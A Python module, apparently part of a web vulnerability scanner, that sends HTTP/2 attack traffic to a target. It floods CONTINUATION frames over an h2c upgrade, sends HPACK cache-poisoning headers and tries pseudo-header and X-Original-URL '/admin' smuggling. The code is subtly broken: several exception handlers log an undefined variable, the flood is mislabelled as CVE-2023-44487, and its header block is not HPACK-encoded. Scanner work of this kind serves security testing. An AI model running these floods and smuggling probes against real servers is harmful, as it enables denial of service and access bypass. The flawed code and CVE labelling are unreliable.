from __future__ import annotations

import asyncio
import logging
import struct
from typing import Any

import httpx

from src.exploitation.http2_exploit import (
    _HPACK_STATIC,
    _attempt_h2c_upgrade,
    _h2_headers_frame,
    _h2_settings_frame,
    _h2_window_update,
)

logger = logging.getLogger(__name__)


def _build_continuation_flood_frames(stream_id: int, header_block: bytes, count: int) -> bytes:
    frames = b""
    for _ in range(count):
        length = len(header_block) & 0x00FFFFFF
        header = struct.pack(">I", length)[1:]
        header += struct.pack(">B", 0x09)
        header += struct.pack(">B", 0x00)
        header += struct.pack(">I", stream_id & 0x7FFFFFFF)
        frames += header + header_block
    return frames


def _hpack_poison_payloads() -> list[dict[str, Any]]:
    return [
        {
            "label": "hpack_cache_poison_1",
            "name": "x-cache-poison",
            "value": "hpack-table-1",
            "injection_header": "X-Cache",
            "injection_value": "HIT",
        },
        {
            "label": "hpack_cache_poison_2",
            "name": "x-amz-user-agent",
            "value": "hpack-table-2",
            "injection_header": "X-Amz-User-Agent",
            "injection_value": "hpack-amzn",
        },
        {
            "label": "hpack_forwarded_scheme",
            "name": "x-forwarded-sch",
            "value": "https",
            "injection_header": "X-Forwarded-Scheme",
            "injection_value": "https",
        },
    ]


def _pseudo_header_smuggle_payloads() -> list[dict[str, Any]]:
    return [
        {
            "label": "pseudo_method_override",
            "header": "X-Forwarded-Method",
            "value": "POST",
            "indicator": "method-confusion",
        },
        {
            "label": "pseudo_path_smuggle",
            "header": "X-Original-URL",
            "value": "/admin",
            "indicator": "path-confusion",
        },
        {
            "label": "h2c_pseudo_header",
            "header": ":method",
            "value": "GET",
            "indicator": "h1-pseudo-headers",
        },
        {
            "label": "h2c_pseudo_path",
            "header": ":path",
            "value": "/",
            "indicator": "h1-pseudo-headers",
        },
    ]


async def send_h2_frame(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, frame_bytes: bytes) -> None:
    writer.write(frame_bytes)
    await writer.drain()


async def _read_h2_response(reader: asyncio.StreamReader, timeout: float = 5.0) -> dict[str, Any]:
    status_code = 0
    headers: dict[str, str] = {}
    body_chunks: list[bytes] = []
    deadline = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < deadline:
        try:
            hdr = await asyncio.wait_for(reader.readexactly(9), timeout=timeout)
        except Exception:
            logger.debug("H2 frame header read failed: %s", exc, exc_info=True)
            break
        length = (hdr[0] << 16) | (hdr[1] << 8) | hdr[2]
        ftype = hdr[3]
        flags = hdr[4]
        stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF
        try:
            payload = await asyncio.wait_for(reader.readexactly(length), timeout=timeout)
        except Exception:
            logger.debug("H2 frame payload read failed: %s", exc, exc_info=True)
            break
        if ftype == 0x01 and stream_id == 1:
            i = 0
            while i < len(payload):
                b = payload[i]
                if b & 0x80:
                    idx = b & 0x7F
                    if 0 < idx <= len(_HPACK_STATIC):
                        name, value = _HPACK_STATIC[idx - 1]
                        if name == ":status":
                            try:
                                status_code = int(value)
                            except ValueError as exc:
                                logger.warning("Operation failed in h2_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
                        else:
                            headers[name] = value
                    i += 1
                elif b & 0x40:
                    i += 1
                    if i < len(payload):
                        idx = b & 0x3F
                        i += 1
                    if i < len(payload):
                        str_len = payload[i] & 0x7F
                        i += 1 + str_len
                    if i < len(payload):
                        val_len = payload[i] & 0x7F
                        i += 1 + val_len
                else:
                    i += 1
        elif ftype == 0x00 and stream_id == 1:
            body_chunks.append(payload)
        if flags & 0x01:
            break
    body = b"".join(body_chunks)
    return {"status_code": status_code, "headers": headers, "body": body}


async def _fuzz_h2_continuation_on_socket(
    url: str,
    host: str,
    endpoint_key: str,
    base_endpoint: str,
    endpoint_type: str,
    *,
    timeout_seconds: float = 5.0,
    verify_tls: bool = True,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    upgrade = await _attempt_h2c_upgrade(url, verify_tls)
    if not upgrade.get("upgrade_accepted") or not upgrade.get("reader") or not upgrade.get("writer"):
        return findings
    reader = upgrade["reader"]
    writer = upgrade["writer"]
    try:
        await send_h2_frame(reader, writer, _h2_settings_frame())
        await send_h2_frame(reader, writer, _h2_window_update(0, 65535))
        header_block = (
            b":method GET\r\n:path /\r\n:scheme http\r\n:authority "
            + host.encode("latin-1")
            + b"\r\n"
        )
        h2_headers = _h2_headers_frame(
            1,
            [(":method", "GET"), (":path", "/"), (":scheme", "http"), (":authority", host)],
            end_stream=False,
        )
        frames = _build_continuation_flood_frames(1, header_block, 50)
        await send_h2_frame(reader, writer, h2_headers)
        await send_h2_frame(reader, writer, frames)
        resp = await _read_h2_response(reader, timeout=timeout_seconds)
    except Exception as exc:
        logger.debug("h2 continuation on socket failed: %s", exc)
        resp = {"error": str(exc)}
    finally:
        try:
            writer.close()
        except Exception as exc:
            logger.warning("Operation failed in h2_fuzzer.py: %s", exc, exc_info=True)  # noqa: BLE001
    status_code = resp.get("status_code", 0)
    body = resp.get("body", b"")
    body_text = body[:400].decode("latin-1", errors="replace") if isinstance(body, (bytes, bytearray)) else ""
    evidence = {
        "status_code": status_code,
        "body_preview": body_text,
        "frames_sent": 50,
        "reason": "HTTP/2 CONTINUATION flood without END_HEADERS (CVE-2023-44487)",
    }
    if status_code >= 500 or "memory" in body_text.lower() or "overflow" in body_text.lower():
        findings.append(
            {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": base_endpoint,
                "endpoint_type": endpoint_type,
                "issues": ["h2_continuation_flood_cve_2023_44487"],
                "probe_type": "h2_fuzzer",
                "severity": "critical",
                "confidence": 0.85,
                "evidence": evidence,
            }
        )
    elif status_code in (200, 201) and ("continuation" in body_text.lower() or "h2" in body_text.lower()):
        findings.append(
            {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": base_endpoint,
                "endpoint_type": endpoint_type,
                "issues": ["h2_continuation_flood_pseudo_header_smuggle"],
                "probe_type": "h2_fuzzer",
                "severity": "high",
                "confidence": 0.65,
                "evidence": evidence,
            }
        )
    return findings


async def run_h2_fuzzing_campaign(
    url: str,
    client: httpx.AsyncClient | None = None,
    *,
    timeout_seconds: float = 5.0,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    from urllib.parse import urlparse

    from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
    from src.core.utils.url_validation import is_safe_url_with_dns_check
    if not is_safe_url_with_dns_check(url):
        logger.warning("H2 fuzzer: URL failed SSRF safety check, skipping: %s", url)
        return findings
    parsed = urlparse(url)
    host = parsed.hostname or "localhost"
    endpoint_key = endpoint_signature(url)
    base_endpoint = endpoint_base_key(url)
    endpoint_type = classify_endpoint(url)
    own_client = False
    if client is None:
        client = httpx.AsyncClient(timeout=timeout_seconds, verify=True)
        own_client = True
    findings.extend(
        await _fuzz_h2_continuation_on_socket(
            url,
            host,
            endpoint_key,
            base_endpoint,
            endpoint_type,
            timeout_seconds=timeout_seconds,
        )
    )
    for entry in _hpack_poison_payloads():
        poison_headers = {entry["name"]: entry["value"], "X-Hpack-Probe": "1"}
        try:
            baseline = await client.get(url)
            baseline_len = len(baseline.text) if baseline else 0
            resp = await client.get(url, headers=poison_headers)
            if resp is None:
                continue
            divergence = resp.status_code != (baseline.status_code if baseline else 200) or abs(
                len(resp.text) - baseline_len
            ) > 50
        except Exception:
            logger.debug("HPACK poison request failed: %s", exc, exc_info=True)
            divergence = False
        if divergence:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["h2_hpack_poisoning_divergence"],
                    "probe_type": "h2_fuzzer",
                    "severity": "high",
                    "confidence": 0.7,
                    "evidence": {
                        "label": entry["label"],
                        "header": entry["name"],
                        "value": entry["value"],
                        "reason": "HPACK injection caused response divergence",
                    },
                }
            )
    for probe in _pseudo_header_smuggle_payloads():
        smuggle_headers = {probe["header"]: probe["value"], "X-Pseudo-Probe": "1"}
        try:
            resp = await client.get(url, headers=smuggle_headers)
        except Exception:
            logger.debug("Pseudo-header request failed: %s", exc, exc_info=True)
            continue
        if resp is None:
            continue
        if probe["header"].startswith(":") and resp.status_code < 500:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": base_endpoint,
                    "endpoint_type": endpoint_type,
                    "issues": ["h2_pseudo_header_accepted"],
                    "probe_type": "h2_fuzzer",
                    "severity": "medium",
                    "confidence": 0.6,
                    "evidence": {
                        "label": probe["label"],
                        "header": probe["header"],
                        "value": probe["value"],
                        "status_code": resp.status_code,
                        "reason": "Pseudo-header accepted over HTTP/1.1 connection",
                    },
                }
            )
    if own_client:
        await client.aclose()
    return findings
